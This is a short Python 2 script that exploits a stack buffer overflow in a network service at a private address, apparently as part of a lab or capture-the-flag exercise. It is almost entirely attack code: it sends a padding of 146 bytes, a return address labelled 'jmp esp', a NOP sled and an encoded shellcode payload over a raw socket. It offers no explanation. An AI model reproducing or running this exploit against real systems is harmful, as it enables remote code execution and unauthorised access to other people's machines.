#!/usr/bin/env python2
import socket

buf =  b""
buf += b"\xd9\xee\xd9\x74\x24\xf4\xb8\x40\x1e\x95\xb0\x5b\x29"
buf += b"\xc9\xb1\x4b\x31\x43\x19\x03\x43\x19\x83\xeb\xfc\xa2"
buf += b"\xeb\x69\x58\xad\x14\x92\x99\xd1\x25\x40\x10\xf4\x22"
buf += b"\xef\x71\xc6\x21\xbd\x79\xad\x64\x56\x09\xc3\xa0\x59"
buf += b"\xba\x69\x97\x54\x3b\x5c\x17\x3a\xff\xff\xeb\x41\x2c"
buf += b"\xdf\xd2\x89\x21\x1e\x12\x5c\x4f\xcf\xce\xd4\xfd\x1f"
buf += b"\x64\xa8\x3d\x48\x7b\xfd\xb5\x36\x03\x78\x09\xc2\xbf"
buf += b"\x83\x5a\x7a\xcb\xcc\x42\xf1\x93\xec\x73\xd6\xa1\x24"
buf += b"\x07\xe4\xe0\x87\x17\x9f\xc7\x6c\xe6\x49\x16\xb3\x28"
buf += b"\xba\x54\x9f\xaa\x83\x5f\x3f\xd9\xff\xa3\xc2\xda\xc4"
buf += b"\xde\x18\x6e\xda\x79\xea\xc8\x3e\x7b\x3f\x8e\xb5\x77"
buf += b"\xf4\xc4\x91\x9b\x0b\x08\xaa\xa0\x80\xaf\x7c\x21\xd2"
buf += b"\x8b\x58\x69\x80\xb2\xf9\xd7\x67\xca\x19\xbf\xd8\x6e"
buf += b"\x52\x52\x0e\x0e\x9b\xac\x2f\x52\x0b\x60\xe2\x6d\xcb"
buf += b"\xee\x75\x1d\xf9\xb1\x2d\x89\xb1\x3a\xe8\x4e\xb6\x10"
buf += b"\x4c\xc0\x49\x9b\xad\xc8\x8d\xcf\xfd\x62\x24\x70\x96"
buf += b"\x72\xc9\xa5\x03\x78\x6c\x16\x36\x83\xe4\x97\xdc\x7e"
buf += b"\x90\x7d\x2f\xa0\x80\x7d\xe5\xc9\x28\x80\x06\xec\xbd"
buf += b"\x0d\xe0\x7a\xad\x5b\xba\x12\x0f\xb8\x73\x84\x70\xea"
buf += b"\x2b\x22\x39\xfc\xec\x4d\xba\x2a\x5b\xda\x30\x39\x5f"
buf += b"\xfb\x47\x14\xf7\x6c\xdf\xe2\x96\xdf\x7e\xf2\xb2\x8a"
buf += b"\x80\x66\x39\x1d\xd7\x1e\x43\x78\x1f\x81\xbc\xaf\x14"
buf += b"\x08\x29\x10\x42\x75\xbd\x90\x92\x23\xd7\x90\xfa\x93"
buf += b"\x83\xc2\x1f\xdc\x19\x77\x8c\x49\xa2\x2e\x61\xd9\xca"
buf += b"\xcc\x5c\x2d\x55\x2e\x8b\xaf\xa9\xf9\xf5\xc5\xc3\x39"


ServiceIP = "10.185.10.55"
ServicePort = 42424

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ServiceIP, ServicePort))

msg = "\x41"*146              #146 junkbyte
msg += "\xbf\x16\x04\x08"     #jmp esp
msg += "\x90"*16              #some NOP
msg += buf                    #payload
msg += "\r\n"                

s.send(msg)
data = s.recv(len(msg))
s.recv(1024)
s.close()

